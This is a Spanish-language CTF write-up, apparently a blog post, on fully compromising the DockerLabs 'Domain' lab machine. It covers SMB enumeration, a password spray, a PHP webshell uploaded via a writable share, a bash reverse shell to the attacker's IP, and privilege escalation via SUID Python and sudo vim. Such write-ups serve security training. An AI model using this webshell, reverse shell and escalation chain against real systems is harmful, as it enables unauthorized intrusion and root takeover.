---
layout: single
title: "Máquina Domain — DockerLabs"
date: 2025-01-15
categories: [writeups, dockerlabs]
tags: [writeup, dockerlabs, smb, samba, webshell, privesc, ctf]
excerpt: "Explotación de share SMB con escritura para subir webshell PHP, escalada www-data → james → root"
permalink: /writeups/domain-dockerlabs/
---

## Enumeración

Nmap detecta tres puertos:

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

La web muestra información sobre Samba. Vector claro: SMB + HTTP.

### Recursos SMB

```bash
smbclient -L 172.17.0.2 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
html            Disk      HTML Share
IPC$            IPC       IPC Service
```

El share `html` llama la atención — suena a raíz del servidor web.

### Enumeración de usuarios

```bash
rpcclient -U '' -N 172.17.0.2
rpcclient $> enumdomusers
user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]
```

Dos usuarios: `james` y `bob`.

### Password spray

```bash
netexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt --no-brute
```

Credenciales válidas: `bob:star`.

### Acceso SMB con escritura

```bash
smbmap -H 172.17.0.2 -u bob -p star
```

```
[+] html    READ, WRITE
```

El share `html` tiene permisos de escritura para `bob` y está mapeado a la raíz del Apache.

---

## Explotación — Webshell

```bash
smbclient //172.17.0.2/html -U bob%star
smb: \> put shell.php
```

Contenido de `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

Comprobación:

```
http://172.17.0.2/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE como `www-data`. Subimos una reverse shell:

```bash
# listener
nc -lvnp 4444

# payload via webshell
http://172.17.0.2/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'
```

---

## Tratamiento de TTY

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export SHELL=bash; export TERM=xterm
stty rows 40 cols 160
```

---

## Escalada de privilegios

### www-data → james

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/python3.10
```

SUID en Python3:

```bash
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Acceso directo a root, pero también hay credenciales de james en `/home/james/.creds`:

```bash
cat /home/james/.creds
# james:Domain1234!
```

### james → root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
```

```bash
sudo vim -c ':!/bin/bash'
```

Shell como `root`.

---

## Resumen

| Fase | Técnica | Herramienta |
|------|---------|-------------|
| Recon | Escaneo de puertos | Nmap |
| Enumeración SMB | Listado de shares y usuarios | smbclient, rpcclient |
| Credenciales | Password spray | NetExec |
| Foothold | Webshell PHP via SMB write | smbclient |
| TTY | Script + stty | bash |
| PrivEsc 1 | SUID Python3 | python3 |
| PrivEsc 2 | sudo vim | vim |
